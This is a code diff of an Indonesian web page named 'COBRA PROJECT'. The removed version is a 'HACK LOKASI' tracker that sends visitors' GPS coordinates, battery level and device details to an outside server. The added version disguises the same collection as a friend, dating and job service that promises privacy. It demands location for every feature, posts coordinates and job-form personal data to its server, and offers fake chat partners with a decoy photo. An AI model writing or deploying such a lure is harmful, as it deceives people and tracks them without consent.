@@ -1,48 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>COBRA MD PROJECT</title>
+  <title>COBRA PROJECT</title>
   <style>
     body {
       background-color: black;
       color: #ff4d4d;
       font-family: monospace;
+      margin: 0;
+      padding: 0;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
-      text-align: center;
       overflow: hidden;
+      text-align: center;
     }
     h1 {
-      font-size: 2.5em;
+      font-size: 2em;
       margin-bottom: 10px;
       animation: flicker 1.5s infinite alternate;
     }
     .glitch-button {
       border: 2px solid #ff4d4d;
-      padding: 15px 30px;
-      margin-top: 30px;
-      font-size: 1.2em;
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 1em;
       cursor: pointer;
       color: #ff4d4d;
       background: black;
-      position: relative;
       transition: background 0.3s, color 0.3s;
     }
     .glitch-button:hover {
       background: #ff4d4d;
       color: black;
-    }
-    #result {
-      margin-top: 25px;
-      font-size: 1.1em;
-      color: white;
-      z-index: 2;
     }
     #loading {
       position: fixed;
@@ -63,86 +57,236 @@
       from { opacity: 1; }
       to { opacity: 0.5; }
     }
+    input, button {
+      font-family: monospace;
+    }
   </style>
 </head>
 <body>
   <div id="loading">🧠 Mendeteksi realitas digital...</div>
-
-  <h1>☠️ WELCOME TO<br> COBRA MD PROJECT</h1>
-
-  <div class="glitch-button" onclick="track()">HACK LOKASI</div>
-
-  <div id="result"></div>
+  <div id="app" style="display:none;"></div>
 
   <script>
-    const result = document.getElementById("result");
-    const loading = document.getElementById("loading");
-    const randomNames = ["SatriaHitam", "HantuLangit", "Pengintai08", "X-Shadow", "404User", "SilentWolf", "DewaGelap"];
+    const app = document.getElementById('app');
 
     window.onload = () => {
       setTimeout(() => {
-        loading.remove(); // Fix tombol gak bisa dipencet
+        document.getElementById('loading').remove();
+        showWelcome();
       }, 2000);
     };
 
-    function sendLog(lat, lon, acc, battery) {
-      fetch("https://cobraanotdeveloper.pythonanywhere.com/log", { // GANTI KE SERVERMU KALAU PERLU
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Authorization": "Bearer cobraproject"
-        },
-        body: JSON.stringify({
-          lat: lat,
-          lon: lon,
-          acc: acc,
-          ua: navigator.userAgent,
-          memory: navigator.deviceMemory || "Unknown",
-          platform: navigator.platform || "Unknown",
-          battery: battery
-        })
-      }).then(() => {
-        const name = randomNames[Math.floor(Math.random() * randomNames.length)];
-        result.innerHTML = `🔍 Penguntitmu: <b>${name}</b>`;
-      }).catch(() => {
-        result.innerHTML = "❌ Gagal kirim ke server.";
-      });
+    function showWelcome() {
+      app.innerHTML = `
+        <h1>👋 Halo kak/bang!</h1>
+        <p>Selamat datang di <b>Project Cobra Web</b></p>
+        <p>Kami menyediakan layanan:</p>
+        <ul style="list-style:none; padding:0; margin:10px 0;">
+          <li>🤝 Cari Teman</li>
+          <li>💘 Cari Pasangan</li>
+          <li>💼 Cari Pekerjaan</li>
+        </ul>
+        <p style="max-width:500px; margin:auto;">Kami sedang mengembangkan web ini. Data & privasi Anda dijamin aman.</p>
+        <div class="glitch-button" onclick="showMainMenu()">Masuk</div>
+      `;
     }
 
-    function track() {
-      result.innerHTML = "⏳ Mengakses koordinat target...";
+    function showMainMenu() {
+      app.innerHTML = `
+        <h1>👁️‍🗨️ Cobra Project</h1>
+        <p>Silakan pilih layanan:</p>
+        <div class="glitch-button" onclick="cariPasangan()">💘 Cari Pasangan</div>
+        <div class="glitch-button" onclick="cariTeman()">🤝 Cari Teman</div>
+        <div class="glitch-button" onclick="cariPekerjaan()">💼 Cari Pekerjaan</div>
+      `;
+      app.style.display = "flex";
+      app.style.flexDirection = "column";
+    }
 
-      if (!navigator.geolocation) {
-        result.innerHTML = "❌ Perangkat tidak mendukung lokasi.";
-        sendLog(null, null, null, "Unknown");
-        return;
-      }
+    function getRandomName() {
+      const names = ["Aluna", "Dimas", "Raisa", "Irfan", "Salsa", "Vina", "Rian", "Citra", "Agus"];
+      return names[Math.floor(Math.random() * names.length)];
+    }
 
+    function kirimDataKeServer(data) {
+      fetch("/kirimdata", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).then(res => res.json())
+        .then(res => {
+          if (!res.success) console.warn("Gagal kirim ke server");
+        }).catch(err => {
+          console.error("Error kirim:", err);
+        });
+    }
+
+    function cariPasangan() {
+      app.innerHTML = `<h1>📍 Meminta akses lokasi...</h1>`;
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
-          const acc = pos.coords.accuracy;
-
-          navigator.getBattery().then((batt) => {
-            const battery = Math.round(batt.level * 100) + "%";
-            result.innerHTML = "📡 Lokasi ditemukan. Memproses...";
-            sendLog(lat, lon, acc, battery);
-          }).catch(() => {
-            sendLog(lat, lon, acc, "Unknown");
+          kirimDataKeServer({
+            fitur: "Cari Pasangan",
+            lat, lon,
+            waktu: new Date().toLocaleString()
           });
+          app.innerHTML = `<h1>🔍 Mencari pasangan terdekat...</h1>`;
+          setTimeout(() => {
+            chatUI(getRandomName(), "Pasangan");
+          }, 3000);
         },
         () => {
-          result.innerHTML = "⚠️ Akses lokasi ditolak. Menggunakan protokol alternatif...";
-          navigator.getBattery().then((batt) => {
-            const battery = Math.round(batt.level * 100) + "%";
-            sendLog(null, null, null, battery);
-          }).catch(() => {
-            sendLog(null, null, null, "Unknown");
-          });
+          app.innerHTML = `
+            <h1>❌ Lokasi dibutuhkan</h1>
+            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
+            <div class="glitch-button" onclick="cariPasangan()">📍 Coba Lagi</div>
+          `;
         },
         { timeout: 5000 }
       );
+    }
+
+    function cariTeman() {
+      app.innerHTML = `<h1>📍 Mendeteksi lokasi untuk mencari teman...</h1>`;
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          kirimDataKeServer({
+            fitur: "Cari Teman",
+            lat, lon,
+            waktu: new Date().toLocaleString()
+          });
+          app.innerHTML = `<h1>🔍 Mencari teman terdekat...</h1>`;
+          setTimeout(() => {
+            chatUI(getRandomName(), "Teman");
+          }, 3000);
+        },
+        () => {
+          app.innerHTML = `
+            <h1>❌ Lokasi dibutuhkan</h1>
+            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
+            <div class="glitch-button" onclick="cariTeman()">📍 Coba Lagi</div>
+          `;
+        },
+        { timeout: 5000 }
+      );
+    }
+
+    function cariPekerjaan() {
+      app.innerHTML = `<h1>📍 Meminta lokasi untuk mencari kerja...</h1>`;
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          kirimDataKeServer({
+            fitur: "Cari Pekerjaan",
+            lat, lon,
+            waktu: new Date().toLocaleString()
+          });
+          setTimeout(() => {
+            showPekerjaanForm();
+          }, 2000);
+        },
+        () => {
+          app.innerHTML = `
+            <h1>❌ Lokasi dibutuhkan</h1>
+            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
+            <div class="glitch-button" onclick="cariPekerjaan()">📍 Coba Lagi</div>
+          `;
+        },
+        { timeout: 5000 }
+      );
+    }
+
+    function chatUI(name, type) {
+      app.innerHTML = `
+        <h1>💬 Chat dengan ${name} (${type})</h1>
+        <div id="chatbox" style="flex:1; overflow-y:auto; background:#111; padding:10px; width:90%; max-width:500px; border:1px solid #ff4d4d; margin:10px auto; height:300px;"></div>
+        <div style="display:flex; justify-content:center; gap:5px;">
+          <input id="userInput" placeholder="Tulis pesan..." style="flex:1; padding:10px; background:#1a1a1a; color:white; border:none; width:60%;">
+          <button onclick="sendMsg('${name}')" class="glitch-button">Kirim</button>
+          <button onclick="document.getElementById('imgInput').click()" class="glitch-button">📷</button>
+        </div>
+        <input type="file" accept="image/*" id="imgInput" style="display:none" onchange="sendImg(event, '${name}')">
+      `;
+      const chatbox = document.getElementById("chatbox");
+      chatbox.innerHTML += `<p><b>${name}:</b> Hai! Aku pengen ngobrol 😄</p>`;
+    }
+
+    function sendMsg(name) {
+      const box = document.getElementById("chatbox");
+      const input = document.getElementById("userInput");
+      const text = input.value.trim();
+      if (!text) return;
+      box.innerHTML += `<p><b>Kamu:</b> ${text}</p>`;
+      input.value = "";
+      if (text.toLowerCase().includes("pap") || text.toLowerCase().includes("foto")) {
+        setTimeout(() => {
+          box.innerHTML += `<p><b>${name}:</b> Nih aku kirim ya...</p>`;
+          box.innerHTML += `<img src="https://i.pinimg.com/564x/17/28/27/172827e2c1992f3a6b6d818ae6fce4f6.jpg" width="150" style="border-radius:8px; margin-top:5px;">`;
+          box.scrollTop = box.scrollHeight;
+        }, 1000);
+      } else {
+        setTimeout(() => {
+          box.innerHTML += `<p><b>${name}:</b> Kamu asik juga ya 😁</p>`;
+          box.scrollTop = box.scrollHeight;
+        }, 1000);
+      }
+      box.scrollTop = box.scrollHeight;
+    }
+
+    function sendImg(e, name) {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = function(evt) {
+        const box = document.getElementById("chatbox");
+        box.innerHTML += `<p><b>Kamu:</b></p><img src="${evt.target.result}" width="150" style="border-radius:8px; margin-top:5px;">`;
+        setTimeout(() => {
+          box.innerHTML += `<p><b>${name}:</b> Wah... 🫣</p>`;
+          box.scrollTop = box.scrollHeight;
+        }, 1000);
+        box.scrollTop = box.scrollHeight;
+      };
+      reader.readAsDataURL(file);
+    }
+
+    function showPekerjaanForm() {
+      app.innerHTML = `
+        <h1>📝 Formulir Lamaran Pekerjaan</h1>
+        <input placeholder="Nama Lengkap" id="namaKerja" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
+        <input placeholder="Umur" id="umurKerja" type="number" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
+        <input placeholder="Minat Pekerjaan" id="minatKerja" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
+        <div class="glitch-button" onclick="kirimLamaran()">Kirim Lamaran</div>
+      `;
+    }
+
+    function kirimLamaran() {
+      const nama = document.getElementById("namaKerja").value.trim();
+      const umur = document.getElementById("umurKerja").value.trim();
+      const minat = document.getElementById("minatKerja").value.trim();
+      if (!nama || !umur || !minat) {
+        alert("Isi semua data.");
+        return;
+      }
+
+      kirimDataKeServer({
+        fitur: "Form Lamaran",
+        nama, umur, minat,
+        waktu: new Date().toLocaleString()
+      });
+
+      app.innerHTML = `<h1>⏳ Memproses lamaran Anda...</h1>`;
+      setTimeout(() => {
+        app.innerHTML = `
+          <h1>✅ Lamaran Diterima</h1>
+          <p>Terima kasih ${nama}, kami akan menghubungi Anda jika cocok.</p>
+          <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
+        `;
+      }, 3000);
     }
   </script>
 </body>
